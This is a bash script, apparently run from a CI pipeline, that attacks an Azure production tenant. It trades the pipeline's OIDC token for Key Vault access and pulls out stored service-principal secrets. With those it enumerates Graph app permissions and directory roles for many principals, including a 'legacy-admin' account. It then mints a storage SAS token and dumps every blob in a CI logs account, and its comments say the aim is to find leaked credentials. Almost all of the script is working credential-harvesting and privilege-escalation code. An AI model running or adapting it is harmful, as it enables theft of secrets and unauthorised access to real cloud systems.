#!/usr/bin/env bash
# (1) Enumerate Graph app-permissions + directory-role memberships for legacy-admin & all SPs.
# (2) Fully enumerate cilogs storage (sync-service has Storage Account Contributor) for leaked creds.
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"
AUD="api://AzureADTokenExchange"
mint_oidc () { curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
OIDC_KV=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$(mint_oidc)" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
getsec () { curl -s -H "Authorization: Bearer $OIDC_KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$1?api-version=7.4" | jq -r .value; }

# directory-audit graph token
DSEC=$(getsec directory-audit-principal); DA=$(echo "$DSEC"|jq -r .appId); DK=$(echo "$DSEC"|jq -r .clientSecret)
GT=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$DA" -d "grant_type=client_credentials" -d "client_secret=$DK" --data-urlencode "scope=https://graph.microsoft.com/.default" | jq -r .access_token)
echo "### graph token len ${#GT}"

echo "### build Graph appRole id->value map"
curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals(appId='00000003-0000-0000-c000-000000000000')?\$select=appRoles" > /tmp/graphsp.json
map_role () { jq -r --arg id "$1" '.appRoles[]?|select(.id==$id)|.value' /tmp/graphsp.json; }

# principals of interest: name -> oid  (resolve SP oid by appId where unknown)
sp_oid_by_app () { curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals(appId='$1')?\$select=id" | jq -r .id; }
LEGACY_OID=43834909-47cf-4a4a-8048-e323b4897ed3
DIRSYNC_OID=$(sp_oid_by_app 7c2e61eb-f928-45cd-99c9-20da958dd216)
REPINS_OID=$(sp_oid_by_app 6eb124e3-de61-4fc9-a124-213d98d737f5)
APPMSI_OID=eeab432e-1bf6-400e-b155-a28ce7cafcdb

declare -A OIDS=(
 [legacy-admin]=$LEGACY_OID
 [sync-service]=70a07660-06bb-4396-b754-59fbad0b143e
 [secrets-sync]=c15570ad-5fd2-430c-97bb-a49e9a08d95c
 [cost-reader]=1fe7a412-82e9-4135-ab4b-72a0be429adb
 [directory-audit]=696cace1-fb1c-4ef3-a9b1-e9abe1681513
 [reporting-service]=732dfdbc-e325-4e9f-9ca9-359af1197807
 [reporting-viewer]=eca94ded-76e6-4bb7-b435-40543a8c6b5f
 [directory-sync]=$DIRSYNC_OID
 [reporting-insights]=$REPINS_OID
 [app-msi-storefront]=$APPMSI_OID
)
for N in "${!OIDS[@]}"; do
  O="${OIDS[$N]}"; echo "### [$N] oid=$O"
  echo "   -- Graph app permissions --"
  curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals/$O/appRoleAssignments" \
    | jq -r '.value[]?|.resourceDisplayName+" :: "+.appRoleId' | while read -r line; do
        rid="${line##*:: }"; echo "      $line  => $(map_role "$rid")"; done
  echo "   -- directory roles / groups (memberOf) --"
  curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals/$O/memberOf" \
    | jq -r '.value[]? | "      "+(."@odata.type")+" "+(.displayName // .id)'
  echo "   -- oauth2 delegated grants --"
  curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals/$O/oauth2PermissionGrants" \
    | jq -r '.value[]? | "      scope="+(.scope//"?")' | head -5
done

echo
echo "################ CILOGS FULL ENUMERATION (sync-service) ################"
SSEC=$(getsec sync-service-principal); SA=$(echo "$SSEC"|jq -r .appId); SK=$(echo "$SSEC"|jq -r .clientSecret)
SMG=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$SA" -d "grant_type=client_credentials" -d "client_secret=$SK" --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
SAS=$(curl -s -X POST -H "Authorization: Bearer $SMG" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listAccountSas?api-version=2023-05-01" \
  -d '{"signedServices":"bfqt","signedResourceTypes":"sco","signedPermission":"rl","signedProtocol":"https","signedStart":"2026-10-22T00:00:00Z","signedExpiry":"2026-10-23T00:00:00Z"}' | jq -r .accountSasToken)
echo "### cilogs containers:"
curl -s "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list&$SAS" | grep -o '<Name>[^<]*</Name>'
for C in $(curl -s "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list&$SAS" | grep -o '<Name>[^<]*</Name>' | sed -E 's/<\/?Name>//g'); do
  echo "### container '$C' blobs:"
  curl -s "https://sttblcilogsprodx3euoz.blob.core.windows.net/$C?restype=container&comp=list&$SAS" | grep -o '<Name>[^<]*</Name>' | sed -E 's/<\/?Name>//g' | while read -r B; do
    echo "   --- $C/$B ---"
    curl -s "https://sttblcilogsprodx3euoz.blob.core.windows.net/$C/$B?$SAS" | head -c 1200; echo
  done
done
echo "=== DONE ==="
